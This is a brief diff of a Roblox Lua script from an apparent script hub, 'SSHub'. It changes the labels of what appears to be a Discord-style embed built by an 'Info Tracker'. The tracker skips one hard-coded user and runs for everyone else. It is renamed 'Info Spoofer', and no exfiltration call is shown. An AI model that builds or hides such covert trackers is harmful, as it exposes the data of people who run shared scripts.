@@ -6,9 +6,10 @@ if game.Players.LocalPlayer.UserId == 860289947 then
 print("Bypassed Info Tracker")
 else
 local Data = {
+    ["username"] = "SSHub",
     ["embeds"] = {
         {
-            ["title"] = "SSHub",
+            ["title"] = "Info Spoofer",
             ["color"] = 9893552,
             ["fields"] = {
                 {
